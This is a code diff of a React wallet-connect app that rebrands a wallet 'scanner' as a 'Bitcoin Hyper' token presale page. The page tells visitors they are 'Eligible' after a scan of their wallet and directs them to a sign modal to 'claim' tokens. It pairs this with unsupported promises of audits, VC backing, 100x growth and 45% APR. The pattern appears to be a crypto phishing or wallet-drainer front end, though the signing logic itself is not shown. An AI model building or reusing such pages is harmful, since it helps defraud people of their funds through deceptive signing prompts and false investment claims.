+              backdropFilter: 'blur(10px)',
+              animation: 'pulseGlow 2s infinite'
+            }}>
+              <div style={{ fontSize: '48px', marginBottom: '20px' }}>✅</div>
+              <h3 style={{ color: '#10b981', fontSize: '24px', marginBottom: '15px' }}>
+                You're Eligible!
+              </h3>
+              <p style={{ color: '#cbd5e1', marginBottom: '25px' }}>
+                Check the sign button above to claim your presale tokens!
+              </p>
+            </div>
+          ) : (
+            <div style={{
+              background: 'rgba(15, 23, 42, 0.8)',
+              padding: '40px',
+              borderRadius: '25px',
+              maxWidth: '500px',
+              margin: '0 auto',
+              border: '2px solid rgba(247, 147, 26, 0.3)',
+              backdropFilter: 'blur(10px)'
+            }}>
+              <div style={{ fontSize: '48px', marginBottom: '20px' }}>⏳</div>
+              <h3 style={{ color: '#F7931A', fontSize: '24px', marginBottom: '15px' }}>
+                Waiting for Scan Results
+              </h3>
+              <p style={{ color: '#cbd5e1' }}>
+                Your eligibility check will complete momentarily...
+              </p>
+            </div>
+          )}
+        </section>
 
-      {renderAdminPanel()}
+        {/* Features Section */}
+        <section style={{
+          padding: isMobile ? '60px 20px' : '100px 50px',
+          background: 'rgba(15, 23, 42, 0.5)'
+        }}>
+          <h2 style={{
+            textAlign: 'center',
+            fontSize: isMobile ? '32px' : '48px',
+            marginBottom: '60px',
+            color: '#F7931A'
+          }}>
+            WHY BITCOIN HYPER?
+          </h2>
+          
+          <div style={{
+            display: 'grid',
+            gridTemplateColumns: isMobile ? '1fr' : 'repeat(3, 1fr)',
+            gap: '30px',
+            maxWidth: '1200px',
+            margin: '0 auto'
+          }}>
+            {[
+              {
+                icon: '⚡',
+                title: 'Lightning Fast',
+                desc: 'Transaction speeds up to 100x faster than traditional Bitcoin'
+              },
+              {
+                icon: '🛡️',
+                title: 'Secure & Audited',
+                desc: 'Fully audited smart contracts with multi-sig security'
+              },
+              {
+                icon: '📈',
+                title: 'High Yield',
+                desc: 'Earn yields up to 45% APR through our DeFi ecosystem'
+              },
+              {
+                icon: '🌐',
+                title: 'Multi-Chain',
+                desc: 'Native interoperability across Ethereum, BSC, Polygon, and more'
+              },
+              {
+                icon: '🎯',
+                title: 'Limited Supply',
+                desc: 'Only 100M tokens ever minted. True scarcity model'
+              },
+              {
+                icon: '🚀',
+                title: 'Massive Growth',
+                desc: 'Backed by top VCs with 100x growth potential'
+              }
+            ].map((feature, index) => (
+              <div key={index} style={{
+                background: 'rgba(15, 23, 42, 0.8)',
+                padding: '30px',
+                borderRadius: '20px',
+                border: '1px solid rgba(247, 147, 26, 0.2)',
+                transition: 'transform 0.3s, border-color 0.3s',
+                ':hover': {
+                  transform: 'translateY(-10px)',
+                  borderColor: '#F7931A'
+                }
+              }}>
+                <div style={{
+                  fontSize: '48px',
+                  marginBottom: '20px',
+                  ...ANIMATIONS.floatUpDown.style
+                }}>
+                  {feature.icon}
+                </div>
+                <h3 style={{
+                  color: '#F7931A',
+                  fontSize: '22px',
+                  marginBottom: '15px'
+                }}>
+                  {feature.title}
+                </h3>
+                <p style={{ color: '#cbd5e1', lineHeight: '1.6' }}>
+                  {feature.desc}
+                </p>
+              </div>
+            ))}
+          </div>
+        </section>
 
-      <footer style={{
-        marginTop: '60px',
-        paddingTop: '20px',
-        borderTop: '1px solid #334155',
-        textAlign: 'center',
-        color: '#64748b',
-        fontSize: '14px'
-      }}>
-        <p>
-          Universal Chain Scanner v2.0 • Auto-Scanning • Instant Rewards
-        </p>
-        <p style={{ fontSize: '12px', marginTop: '10px' }}>
-          Supports 13+ EVM chains • Real-time scanning • Secure wallet connection
-        </p>
-      </footer>
+        {/* Footer */}
+        <footer style={{
+          padding: '40px 20px',
+          textAlign: 'center',
+          borderTop: '1px solid rgba(247, 147, 26, 0.2)',
+          background: 'rgba(15, 23, 42, 0.8)'
+        }}>
+          <div style={{ fontSize: '32px', marginBottom: '20px', ...ANIMATIONS.bitcoinGlow.style }}>
+            ₿
+          </div>
+          <div style={{
+            color: '#94a3b8',
+            fontSize: '14px',
+            maxWidth: '600px',
+            margin: '0 auto 20px'
+          }}>
+            Bitcoin Hyper is the next evolution of Bitcoin. Join the presale now to secure your position.
+          </div>
+          <div style={{
+            display: 'flex',
+            justifyContent: 'center',
+            gap: '20px',
+            marginTop: '30px'
+          }}>
+            <span style={{ color: '#64748b', fontSize: '12px' }}>© 2024 Bitcoin Hyper. All rights reserved.</span>
+            <span style={{ color: '#64748b', fontSize: '12px' }}>|</span>
+            <span style={{ color: '#64748b', fontSize: '12px' }}>Official Presale Platform</span>
+          </div>
+        </footer>
+      </div>
 
+      {/* Sign Modal */}
+      <SignModal />
+
+      {/* Global Styles */}
       <style>{`
         @keyframes spin {
           0% { transform: rotate(0deg); }
           100% { transform: rotate(360deg); }
+        }
+        
+        @keyframes fadeIn {
+          from { opacity: 0; transform: scale(0.9); }
+          to { opacity: 1; transform: scale(1); }
+        }
+        
+        @keyframes gradientFlow {
+          0% { background-position: 0% 50%; }
+          50% { background-position: 100% 50%; }
+          100% { background-position: 0% 50%; }
         }
       `}</style>
     </div>
   );
 }
 
-// ✅ ConnectKit theme
+// ConnectKit Theme
 const customTheme = {
-  borderRadius: 'large',
-  fontStack: 'system',
-  overlay: 'blur',
-  theme: 'midnight'
+  borderRadius: "large",
+  fontStack: "system",
+  overlay: "blur",
+  theme: "midnight",
+  walletModal: "wide"
 };
 
 export default function App() {
@@ -1358,7 +1158,7 @@ export default function App() {
             }
           }}
         >
-          <WalletApp />
+          <BitcoinHyperPresale />
         </ConnectKitProvider>
       </QueryClientProvider>
     </WagmiProvider>
